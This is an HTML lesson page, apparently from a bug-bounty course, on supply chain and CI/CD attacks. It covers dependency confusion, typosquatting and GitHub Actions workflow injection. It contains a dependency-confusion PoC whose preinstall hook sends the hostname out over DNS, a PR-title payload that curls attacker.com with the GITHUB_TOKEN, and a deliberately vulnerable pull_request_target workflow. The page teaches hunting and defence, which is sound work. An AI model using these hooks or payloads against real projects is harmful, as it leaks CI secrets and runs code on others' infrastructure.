@@ -1,0 +1,1282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 17: Supply Chain & CI/CD Security - Bug Hunting</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            min-height: 100vh;
+            background: #0a0508;
+            font-family: 'Georgia', 'Times New Roman', serif;
+            color: #8a6a9a;
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background:
+                radial-gradient(ellipse at 15% 40%, rgba(80, 40, 100, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 85% 60%, rgba(60, 20, 80, 0.06) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .scroll-progress {
+            position: fixed; top: 0; left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #9333ea, #a855f7);
+            z-index: 200; transition: width 0.1s linear; width: 0%;
+        }
+
+        .module-header {
+            background: rgba(10, 5, 15, 0.95);
+            border-bottom: 1px solid rgba(100, 60, 130, 0.2);
+            padding: 18px 40px;
+            display: flex; justify-content: space-between; align-items: center;
+            position: sticky; top: 0; z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .header-left { display: flex; align-items: center; gap: 15px; }
+
+        .back-btn {
+            background: rgba(80, 40, 100, 0.2);
+            border: 1px solid rgba(100, 60, 130, 0.3);
+            color: #9a7aaa; padding: 7px 14px; border-radius: 4px;
+            font-size: 0.8rem; text-decoration: none;
+            transition: all 0.3s ease; font-family: 'Georgia', serif;
+        }
+
+        .back-btn:hover {
+            background: rgba(100, 60, 130, 0.3);
+            border-color: rgba(147, 51, 234, 0.5); color: #c4a0d8;
+        }
+
+        .module-label { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; }
+
+        .header-right { display: flex; align-items: center; gap: 12px; font-size: 0.75rem; color: #6a4a7a; }
+
+        .progress-bar-mini {
+            width: 120px; height: 4px;
+            background: rgba(60, 30, 80, 0.3); border-radius: 2px; overflow: hidden;
+        }
+
+        .progress-bar-mini .fill {
+            height: 100%; background: linear-gradient(90deg, #9333ea, #a855f7);
+            width: 0%; transition: width 0.5s ease;
+        }
+
+        .module-content {
+            max-width: 1100px; margin: 0 auto; padding: 40px;
+            position: relative; z-index: 10;
+        }
+
+        .intro-section { text-align: center; padding: 50px 0 60px; }
+
+        .intro-icon {
+            font-size: 3.5rem; margin-bottom: 20px;
+            filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.3));
+        }
+
+        .intro-title { font-size: 2.4rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; letter-spacing: 0.05em; }
+        .intro-meta { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.25em; text-transform: uppercase; margin-bottom: 20px; }
+        .intro-subtitle { font-size: 1rem; color: #8a6a9a; max-width: 720px; margin: 0 auto; line-height: 1.8; }
+
+        .module-stats { display: flex; justify-content: center; gap: 25px; margin-top: 30px; flex-wrap: wrap; }
+
+        .stat-pill {
+            padding: 8px 18px;
+            background: rgba(60, 30, 80, 0.15);
+            border: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 20px; font-size: 0.75rem; color: #7a5a8a; letter-spacing: 0.1em;
+        }
+
+        .section {
+            margin-bottom: 80px; opacity: 0; transform: translateY(30px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+
+        .section.visible { opacity: 1; transform: translateY(0); }
+
+        .section-number { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 8px; }
+
+        .section-title {
+            font-size: 1.9rem; color: #c4a0d8; margin-bottom: 20px; font-weight: 400;
+            display: flex; align-items: center; gap: 15px;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.15); padding-bottom: 15px;
+        }
+
+        .section-icon { font-size: 1.6rem; opacity: 0.75; }
+
+        .section-body { color: #a080b0; font-size: 0.97rem; }
+        .section-body p { margin-bottom: 16px; }
+        .section-body ul { list-style: none; padding-left: 20px; margin-bottom: 16px; }
+        .section-body li { margin-bottom: 10px; position: relative; padding-left: 20px; }
+        .section-body li::before { content: '\25B8'; position: absolute; left: 0; color: #7a5a8a; }
+
+        .standards-table {
+            width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 0.87rem;
+        }
+
+        .standards-table th {
+            background: rgba(40, 20, 60, 0.5); color: #c4a0d8; padding: 12px 16px;
+            text-align: left; font-weight: normal; letter-spacing: 0.1em;
+            font-size: 0.78rem; text-transform: uppercase;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.2);
+        }
+
+        .standards-table td {
+            padding: 12px 16px; color: #9a7aaa;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.08); vertical-align: top;
+        }
+
+        .standards-table tr:hover td { background: rgba(40, 20, 60, 0.2); }
+        .standards-table .std-name { color: #c4a0d8; font-family: 'Courier New', monospace; font-size: 0.9rem; }
+
+        .badge {
+            display: inline-block; padding: 2px 8px; border-radius: 10px;
+            font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase;
+        }
+
+        .badge-legacy { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-current { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .badge-latest { background: rgba(147, 51, 234, 0.2); color: #c084fc; border: 1px solid rgba(147, 51, 234, 0.3); }
+        .badge-info { background: rgba(59, 130, 246, 0.15); color: #93c5fd; border: 1px solid rgba(59, 130, 246, 0.3); }
+
+        .concept-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 18px; margin: 28px 0;
+        }
+
+        .concept-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15);
+            border-radius: 8px; padding: 22px; transition: all 0.3s ease;
+        }
+
+        .concept-card:hover {
+            transform: translateY(-4px); border-color: rgba(147, 51, 234, 0.35);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        .concept-card-icon { font-size: 1.8rem; margin-bottom: 12px; }
+        .concept-card-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .concept-card-body { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+
+        .callout {
+            border-radius: 8px; padding: 20px 24px; margin: 24px 0;
+            display: flex; gap: 16px; align-items: flex-start;
+        }
+
+        .callout-info { background: rgba(40, 20, 60, 0.4); border-left: 3px solid #9333ea; }
+        .callout-warning { background: rgba(60, 40, 10, 0.4); border-left: 3px solid #ca8a04; }
+        .callout-danger { background: rgba(60, 20, 20, 0.4); border-left: 3px solid #dc2626; }
+        .callout-tip { background: rgba(20, 50, 30, 0.4); border-left: 3px solid #16a34a; }
+
+        .callout-icon { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+        .callout-title { font-size: 0.8rem; letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 6px; }
+        .callout-info .callout-title { color: #a855f7; }
+        .callout-warning .callout-title { color: #eab308; }
+        .callout-danger .callout-title { color: #ef4444; }
+        .callout-tip .callout-title { color: #22c55e; }
+        .callout-text { font-size: 0.9rem; color: #9a7aaa; line-height: 1.65; }
+
+        .code-block {
+            background: rgba(5, 2, 10, 0.8);
+            border: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 6px; padding: 16px 20px; margin: 16px 0;
+            font-family: 'Courier New', monospace; font-size: 0.84rem;
+            color: #b090c0; overflow-x: auto; line-height: 1.6;
+            white-space: pre-wrap;
+        }
+
+        .code-block .kw { color: #a855f7; }
+        .code-block .str { color: #86efac; }
+        .code-block .comment { color: #6a4a7a; font-style: italic; }
+        .code-block .flag { color: #fbbf24; }
+        .code-block .cmd { color: #c4a0d8; }
+
+        .two-col {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;
+        }
+
+        .col-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px;
+        }
+
+        .col-card h3 {
+            font-size: 1rem; color: #c4a0d8; margin-bottom: 12px;
+            display: flex; align-items: center; gap: 8px;
+        }
+
+        .col-card ul { list-style: none; padding: 0; }
+        .col-card li {
+            font-size: 0.88rem; color: #8a6a9a; padding: 6px 0;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.08);
+            display: flex; align-items: flex-start; gap: 8px;
+        }
+        .col-card li:last-child { border-bottom: none; }
+        .li-marker { color: #9333ea; flex-shrink: 0; }
+
+        .numbered-list {
+            list-style: none; padding: 0; margin: 20px 0; counter-reset: step-counter;
+        }
+
+        .numbered-list li {
+            counter-increment: step-counter;
+            padding: 12px 18px 12px 50px; margin-bottom: 8px;
+            background: rgba(15, 8, 20, 0.5);
+            border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px;
+            position: relative; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6;
+        }
+
+        .numbered-list li::before {
+            content: counter(step-counter, decimal-leading-zero);
+            position: absolute; left: 16px; top: 12px;
+            font-family: 'Courier New', monospace; font-size: 0.8rem;
+            color: #9333ea; font-weight: bold;
+        }
+
+        .discussion-section {
+            background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4));
+            border: 1px solid rgba(100, 60, 130, 0.25); border-radius: 10px; padding: 30px; margin: 40px 0;
+        }
+
+        .discussion-title {
+            font-size: 1.1rem; color: #c4a0d8; margin-bottom: 20px;
+            display: flex; align-items: center; gap: 10px;
+        }
+
+        .prompt-list { list-style: none; padding: 0; }
+
+        .prompt-item {
+            padding: 14px 18px; background: rgba(15, 8, 20, 0.5);
+            border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px;
+            margin-bottom: 10px; font-size: 0.9rem; color: #9a7aaa;
+            line-height: 1.6; display: flex; gap: 12px;
+        }
+
+        .prompt-num {
+            color: #9333ea; font-size: 0.8rem;
+            font-family: 'Courier New', monospace; flex-shrink: 0; padding-top: 2px;
+        }
+
+        .detail-section {
+            border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px;
+            margin: 12px 0; overflow: hidden;
+        }
+
+        .detail-header {
+            padding: 16px 20px; background: rgba(15, 8, 20, 0.6);
+            cursor: pointer; display: flex; justify-content: space-between; align-items: center;
+            transition: background 0.3s ease; user-select: none;
+        }
+
+        .detail-header:hover { background: rgba(40, 20, 60, 0.5); }
+
+        .detail-header-left { display: flex; align-items: center; gap: 12px; }
+        .detail-header-icon { font-size: 1rem; opacity: 0.75; }
+        .detail-header-title { font-size: 0.95rem; color: #c4a0d8; }
+        .detail-header-subtitle { font-size: 0.75rem; color: #6a4a7a; margin-top: 2px; }
+        .detail-toggle { color: #7a5a8a; font-size: 0.8rem; transition: transform 0.3s ease; }
+        .detail-toggle.open { transform: rotate(180deg); }
+
+        .detail-body {
+            display: none; padding: 20px 24px; background: rgba(10, 5, 15, 0.4);
+            border-top: 1px solid rgba(100, 60, 130, 0.1);
+            color: #9a7aaa; font-size: 0.9rem; line-height: 1.7;
+        }
+
+        .detail-body.open { display: block; }
+        .detail-body p { margin-bottom: 12px; }
+        .detail-body ul { list-style: none; padding-left: 20px; }
+        .detail-body li { margin-bottom: 8px; position: relative; padding-left: 18px; }
+        .detail-body li::before { content: '\25B8'; position: absolute; left: 0; color: #7a5a8a; }
+
+        .tool-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 16px; margin: 20px 0;
+        }
+
+        .tool-card {
+            background: rgba(15, 8, 20, 0.6);
+            border: 1px solid rgba(100, 60, 130, 0.15);
+            border-radius: 8px; padding: 20px; transition: all 0.3s ease;
+        }
+
+        .tool-card:hover { border-color: rgba(147, 51, 234, 0.3); }
+
+        .tool-name {
+            font-size: 0.95rem; color: #c4a0d8; margin-bottom: 4px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .tool-role {
+            font-size: 0.68rem; color: #9333ea; letter-spacing: 0.12em;
+            text-transform: uppercase; margin-bottom: 10px;
+        }
+
+        .tool-desc { font-size: 0.84rem; color: #8a6a9a; line-height: 1.6; }
+
+        .completion-section {
+            text-align: center; padding: 60px 40px;
+            background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4));
+            border: 1px solid rgba(100, 60, 130, 0.3); border-radius: 12px; margin: 60px 0 40px;
+        }
+
+        .completion-icon { font-size: 3.5rem; margin-bottom: 20px; }
+        .completion-title { font-size: 1.8rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; }
+        .completion-text { color: #8a6a9a; font-size: 0.95rem; max-width: 560px; margin: 0 auto 30px; line-height: 1.8; }
+
+        .completion-btn {
+            display: inline-flex; align-items: center; gap: 10px; padding: 14px 36px;
+            background: linear-gradient(135deg, #7c3aed, #9333ea); border: none; border-radius: 8px;
+            color: #f3e8ff; font-size: 1rem; cursor: pointer; font-family: 'Georgia', serif;
+            letter-spacing: 0.05em; transition: all 0.3s ease; box-shadow: 0 4px 20px rgba(147, 51, 234, 0.3);
+        }
+
+        .completion-btn:hover {
+            background: linear-gradient(135deg, #6d28d9, #7c3aed);
+            box-shadow: 0 6px 30px rgba(147, 51, 234, 0.45); transform: translateY(-2px);
+        }
+
+        @media (max-width: 768px) {
+            .module-header { padding: 15px 20px; }
+            .module-content { padding: 20px; }
+            .two-col { grid-template-columns: 1fr; }
+            .concept-grid { grid-template-columns: 1fr; }
+            .tool-grid { grid-template-columns: 1fr; }
+            .intro-title { font-size: 1.8rem; }
+            .section-title { font-size: 1.4rem; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header class="module-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn">&#8592; Back to Course</a>
+        <div>
+            <div class="module-label">BH // Bug Hunting &middot; Module 17</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span>Reading Progress</span>
+        <div class="progress-bar-mini">
+            <div class="fill" id="readingFill"></div>
+        </div>
+    </div>
+</header>
+
+<main class="module-content">
+
+    <!-- Hero -->
+    <div class="intro-section">
+        <div class="intro-icon">&#9854;</div>
+        <h1 class="intro-title">Supply Chain &amp; CI/CD Security</h1>
+        <div class="intro-meta">Bug Hunting &bull; Module 17 &bull; AI &amp; Emerging Surfaces</div>
+        <p class="intro-subtitle">
+            Supply chain attacks compromise software before it reaches the target. Instead of attacking
+            the application directly, you attack its dependencies, build pipeline, package registry, or
+            deployment infrastructure. A single compromised npm package can affect thousands of downstream
+            applications. A poisoned GitHub Action can exfiltrate secrets from every repository that uses
+            it. This module covers the attack taxonomy and hunting methodology for this rapidly growing
+            vulnerability class.
+        </p>
+        <div class="module-stats">
+            <span class="stat-pill">7 Sections</span>
+            <span class="stat-pill">Supply Chain Security</span>
+            <span class="stat-pill">Advanced</span>
+            <span class="stat-pill">~50 Minutes</span>
+        </div>
+    </div>
+
+    <!-- Section 1: Supply Chain Attack Surface -->
+    <div class="section" id="section-1">
+        <div class="section-number">Section 01</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9670;</span>
+            Supply Chain Attack Surface
+        </h2>
+        <div class="section-body">
+            <p>
+                Supply chain attacks have emerged as one of the most impactful categories in security
+                research. The SolarWinds breach demonstrated that compromising a single build pipeline
+                can grant access to thousands of downstream organizations, including government agencies
+                and Fortune 500 companies. Bug bounty programs are increasingly recognizing supply chain
+                vulnerabilities as in-scope, and platforms like HackerOne have seen a surge in supply
+                chain-related reports.
+            </p>
+
+            <p>
+                The attack surface spans every component between a developer writing code and that code
+                running in production. Each link in this chain, from the IDE plugins a developer uses to
+                the container registry that stores deployment images, represents a potential compromise
+                point. The attacker does not need to find a vulnerability in the target application
+                itself. They just need to find one weakness anywhere in the supply chain.
+            </p>
+
+            <div class="concept-grid">
+                <div class="concept-card">
+                    <div class="concept-card-title">Dependencies</div>
+                    <div class="concept-card-body">
+                        Third-party packages from npm, PyPI, RubyGems, Maven, and other registries.
+                        A typical web application has hundreds of direct and transitive dependencies.
+                        Each one is maintained by someone else, and any one of them could be compromised,
+                        abandoned, or typosquatted.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Build Systems</div>
+                    <div class="concept-card-body">
+                        CI/CD platforms (GitHub Actions, GitLab CI, Jenkins, CircleCI) execute code
+                        automatically in response to repository events. A compromised build step runs
+                        with the pipeline's permissions: access to secrets, deployment credentials, and
+                        the ability to modify build artifacts.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Package Registries</div>
+                    <div class="concept-card-body">
+                        The registries themselves are attack targets. Compromised maintainer accounts,
+                        namespace squatting, and registry API vulnerabilities can all be leveraged to
+                        distribute malicious packages to every downstream consumer.
+                    </div>
+                </div>
+                <div class="concept-card">
+                    <div class="concept-card-title">Container Infrastructure</div>
+                    <div class="concept-card-body">
+                        Docker images, container registries, and base image selection. A malicious
+                        layer in a widely-used base image propagates to every container built on top
+                        of it. Image signing and verification are rarely enforced.
+                    </div>
+                </div>
+            </div>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Attack</th>
+                        <th>Target</th>
+                        <th>Impact</th>
+                        <th>Year</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">SolarWinds</td>
+                        <td>Build pipeline (Orion software)</td>
+                        <td>18,000+ organizations compromised including US government agencies</td>
+                        <td>2020</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">Codecov</td>
+                        <td>CI/CD bash uploader script</td>
+                        <td>Credentials exfiltrated from CI environments across thousands of repos</td>
+                        <td>2021</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">ua-parser-js</td>
+                        <td>npm package hijack</td>
+                        <td>Cryptominer and credential stealer in package with 8M weekly downloads</td>
+                        <td>2021</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">colors/faker</td>
+                        <td>Maintainer sabotage</td>
+                        <td>Popular packages intentionally corrupted by maintainer, breaking thousands of builds</td>
+                        <td>2022</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">xz Utils</td>
+                        <td>Open source maintainer social engineering</td>
+                        <td>Backdoor in compression library used by sshd, nearly compromised most Linux distributions</td>
+                        <td>2024</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout callout-danger">
+                <div class="callout-icon">&#9888;</div>
+                <div>
+                    <div class="callout-title">The xz Utils Incident</div>
+                    <div class="callout-text">
+                        The xz Utils backdoor is the most sophisticated supply chain attack publicly
+                        discovered. An attacker spent over two years building trust as a maintainer of
+                        the xz compression library, eventually inserting a backdoor that would have
+                        given them access to most Linux systems running OpenSSH. The backdoor was
+                        discovered by accident when a developer noticed unusual SSH latency. This
+                        attack demonstrates that supply chain compromise can be a patient, long-term
+                        operation, not just an opportunistic smash-and-grab.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 2: Dependency Confusion & Typosquatting -->
+    <div class="section" id="section-2">
+        <div class="section-number">Section 02</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9670;</span>
+            Dependency Confusion &amp; Typosquatting
+        </h2>
+        <div class="section-body">
+            <p>
+                Dependency confusion exploits the way package managers resolve names. When an organization
+                uses private packages with names that do not exist on the public registry, an attacker can
+                publish a package with the same name on the public registry with a higher version number.
+                Many package managers will prefer the public package over the private one because the
+                version number is higher. This causes the organization to install the attacker's package
+                instead of their own.
+            </p>
+
+            <p>
+                Alex Birsan's 2021 research demonstrated this attack against Apple, Microsoft, Tesla, and
+                dozens of other major companies. He earned over $130,000 in bug bounties by publishing
+                benign proof-of-concept packages that phoned home when installed. The packages executed
+                during install via preinstall/postinstall scripts, which run automatically without user
+                confirmation.
+            </p>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Dependency Confusion Methodology</h3>
+
+            <ul class="numbered-list">
+                <li>Discover internal package names. Look for references in public repositories, leaked package.json files, error messages, job postings mentioning internal tools, and JavaScript source maps that reveal import paths.</li>
+                <li>Verify the package name does not exist on the public registry. If "acme-internal-utils" is referenced in a public leak but does not exist on npmjs.com, it is a candidate for dependency confusion.</li>
+                <li>Publish a proof-of-concept package with the discovered name and a high version number (e.g., 99.0.0). The PoC should only perform a DNS callback to your server with identifying information (hostname, username, working directory). Never include destructive payloads.</li>
+                <li>Include a preinstall script that triggers the callback. In npm, this is the "preinstall" field in package.json. In Python, it is the setup.py install hook. The callback fires automatically when the package is installed.</li>
+                <li>Monitor your callback server. If you receive a connection with the target organization's internal hostname or CI/CD environment variables, the dependency confusion attack was successful. Document the callback data and report through the bug bounty program.</li>
+            </ul>
+
+            <div class="code-block"><span class="comment"># Dependency confusion PoC: package.json</span>
+{
+  <span class="str">"name"</span>: <span class="str">"acme-internal-utils"</span>,
+  <span class="str">"version"</span>: <span class="str">"99.0.0"</span>,
+  <span class="str">"description"</span>: <span class="str">"Security research - dependency confusion PoC"</span>,
+  <span class="str">"scripts"</span>: {
+    <span class="str">"preinstall"</span>: <span class="str">"node callback.js"</span>
+  }
+}
+
+<span class="comment"># callback.js - benign DNS callback only</span>
+<span class="kw">const</span> dns = <span class="cmd">require</span>(<span class="str">'dns'</span>);
+<span class="kw">const</span> os = <span class="cmd">require</span>(<span class="str">'os'</span>);
+<span class="kw">const</span> pkg = <span class="str">'acme-internal-utils'</span>;
+<span class="kw">const</span> data = Buffer.<span class="cmd">from</span>(os.<span class="cmd">hostname</span>()).<span class="cmd">toString</span>(<span class="str">'hex'</span>);
+dns.<span class="cmd">resolve</span>(<span class="str">`${data}.${pkg}.your-callback-domain.com`</span>, () => {});</div>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Typosquatting</h3>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>Common Typo Patterns</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span> Character swaps: "lodash" instead of "lodash"</li>
+                        <li><span class="li-marker">&#9656;</span> Missing hyphens: "reactdom" instead of "react-dom"</li>
+                        <li><span class="li-marker">&#9656;</span> Scope confusion: "colors" vs "@colors/colors"</li>
+                        <li><span class="li-marker">&#9656;</span> Extra characters: "expresss" instead of "express"</li>
+                        <li><span class="li-marker">&#9656;</span> Homoglyphs: Unicode characters that look identical</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>Discovery Techniques</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span> Monitor package registries for new packages similar to popular ones</li>
+                        <li><span class="li-marker">&#9656;</span> Generate typo permutations of high-value package names</li>
+                        <li><span class="li-marker">&#9656;</span> Check for recently published packages with install scripts</li>
+                        <li><span class="li-marker">&#9656;</span> Analyze download patterns for anomalous spikes</li>
+                        <li><span class="li-marker">&#9656;</span> Review npm/PyPI advisory feeds for malicious packages</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="callout callout-warning">
+                <div class="callout-icon">&#9888;</div>
+                <div>
+                    <div class="callout-title">Legal Considerations</div>
+                    <div class="callout-text">
+                        Dependency confusion research occupies a legal gray area. Publishing packages
+                        that execute code on someone else's infrastructure without authorization could
+                        be considered unauthorized access. Always ensure the target has a bug bounty
+                        program that includes supply chain attacks in scope. Use only benign DNS callbacks,
+                        never exfiltrate actual data, and include clear identification in your package
+                        description that it is security research.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 3: GitHub Actions Exploitation -->
+    <div class="section" id="section-3">
+        <div class="section-number">Section 03</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9670;</span>
+            GitHub Actions Exploitation
+        </h2>
+        <div class="section-body">
+            <p>
+                GitHub Actions is the most widely-used CI/CD platform and, consequently, the most
+                targeted. Workflow configuration files (.github/workflows/*.yml) define automated
+                processes that run in response to repository events. Misconfigurations in these
+                workflows can allow attackers to execute arbitrary code in the repository's CI
+                environment, exfiltrate secrets, modify build artifacts, and push malicious code.
+            </p>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Workflow Injection</h3>
+
+            <div class="code-block"><span class="comment"># Vulnerable workflow: PR title injected into shell command</span>
+<span class="kw">name:</span> <span class="str">Comment on PR</span>
+<span class="kw">on:</span>
+  <span class="kw">pull_request:</span>
+    <span class="kw">types:</span> [opened]
+
+<span class="kw">jobs:</span>
+  <span class="kw">comment:</span>
+    <span class="kw">runs-on:</span> ubuntu-latest
+    <span class="kw">steps:</span>
+      - <span class="kw">run:</span> |
+          <span class="cmd">echo</span> <span class="str">"Processing PR: ${{ github.event.pull_request.title }}"</span>
+          <span class="comment"># Attacker sets PR title to: "; curl attacker.com/steal?t=$GITHUB_TOKEN #</span>
+          <span class="comment"># The title is interpolated directly into the shell command</span>
+          <span class="comment"># This is command injection via GitHub Actions expression</span></div>
+
+            <p>
+                The vulnerability occurs because GitHub Actions expressions like
+                <code style="color: #a855f7;">$&#123;&#123; github.event.pull_request.title &#125;&#125;</code>
+                are interpolated directly into the shell command before execution. If the value
+                contains shell metacharacters, they are interpreted as commands. The attacker controls
+                the PR title, body, branch name, and commit messages, all of which can be injected.
+            </p>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Pwn Requests (pull_request_target)</h3>
+
+            <div class="detail-section">
+                <div class="detail-header" onclick="toggleDetail(this)">
+                    <div class="detail-header-left">
+                        <div>
+                            <div class="detail-header-title">The pull_request_target Danger</div>
+                            <div class="detail-header-subtitle">Running untrusted code with repository secrets</div>
+                        </div>
+                    </div>
+                    <span class="detail-toggle">&#9660;</span>
+                </div>
+                <div class="detail-body">
+                    <p>The <code>pull_request_target</code> trigger runs workflows in the context of the base branch (usually main) rather than the PR branch. This gives it access to repository secrets, which <code>pull_request</code> workflows from forks do not have. If a <code>pull_request_target</code> workflow checks out the PR's code and runs it, the attacker's code executes with full secret access.</p>
+                    <div class="code-block"><span class="comment"># DANGEROUS: pull_request_target + checkout of PR code</span>
+<span class="kw">on:</span> pull_request_target
+
+<span class="kw">jobs:</span>
+  <span class="kw">build:</span>
+    <span class="kw">runs-on:</span> ubuntu-latest
+    <span class="kw">steps:</span>
+      - <span class="kw">uses:</span> actions/checkout@v4
+        <span class="kw">with:</span>
+          <span class="kw">ref:</span> <span class="str">${{ github.event.pull_request.head.sha }}</span>
+          <span class="comment"># This checks out the ATTACKER'S code</span>
+      - <span class="kw">run:</span> npm install &amp;&amp; npm test
+        <span class="comment"># Runs attacker's code with access to all repo secrets</span>
+        <span class="kw">env:</span>
+          <span class="kw">DEPLOY_KEY:</span> <span class="str">${{ secrets.DEPLOY_KEY }}</span></div>
+                    <p>This pattern, dubbed "pwn request" by the security community, is one of the most impactful GitHub Actions vulnerabilities. An attacker forks the repository, modifies the build scripts or test files to exfiltrate secrets, and opens a PR. The workflow runs automatically and sends the secrets to the attacker before any human reviews the PR.</p>
+                </div>
+            </div>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">GITHUB_TOKEN Permissions</h3>
+
+            <div class="two-col">
+                <div class="col-card">
+                    <h3>Default Permissions (Risky)</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span> contents: write (can push code)</li>
+                        <li><span class="li-marker">&#9656;</span> packages: write (can publish packages)</li>
+                        <li><span class="li-marker">&#9656;</span> pull-requests: write (can merge PRs)</li>
+                        <li><span class="li-marker">&#9656;</span> issues: write (can modify issues)</li>
+                    </ul>
+                </div>
+                <div class="col-card">
+                    <h3>Recommended (Least Privilege)</h3>
+                    <ul>
+                        <li><span class="li-marker">&#9656;</span> contents: read (read-only access)</li>
+                        <li><span class="li-marker">&#9656;</span> Explicit per-job permission declarations</li>
+                        <li><span class="li-marker">&#9656;</span> No write permissions unless specifically needed</li>
+                        <li><span class="li-marker">&#9656;</span> Repository-level default set to read-only</li>
+                    </ul>
+                </div>
+            </div>
+
+            <h3 style="color: #c4a0d8; font-size: 1.1rem; margin: 28px 0 16px; font-weight: 400;">Poisoned Actions</h3>
+
+            <p>
+                Third-party GitHub Actions are another supply chain vector. When a workflow uses
+                <code style="color: #a855f7;">uses: some-org/some-action@main</code>, it pulls and
+                executes code from that external repository. If the external action is compromised or
+                if its maintainer pushes a malicious update, every workflow that references it is
+                affected. Always pin actions to a specific commit SHA rather than a branch or tag.
+            </p>
+
+            <div class="code-block"><span class="comment"># Vulnerable: references a mutable tag</span>
+- <span class="kw">uses:</span> actions/checkout@v4     <span class="comment"># Tag can be moved to malicious commit</span>
+
+<span class="comment"># Better: pin to specific commit SHA</span>
+- <span class="kw">uses:</span> actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  <span class="comment"># v4.1.1</span>
+
+<span class="comment"># Searching for vulnerable patterns in a target's repos:</span>
+<span class="comment"># Look for workflows using pull_request_target + checkout</span>
+<span class="comment"># Look for expression injection in run: steps</span>
+<span class="comment"># Look for third-party actions pinned to branches instead of SHAs</span></div>
+
+            <div class="callout callout-tip">
+                <div class="callout-icon">&#10004;</div>
+                <div>
+                    <div class="callout-title">Hunting GitHub Actions Bugs</div>
+                    <div class="callout-text">
+                        GitHub Actions vulnerabilities are highly rewarded because they often grant access
+                        to deployment credentials and the ability to push code. To hunt for them: clone
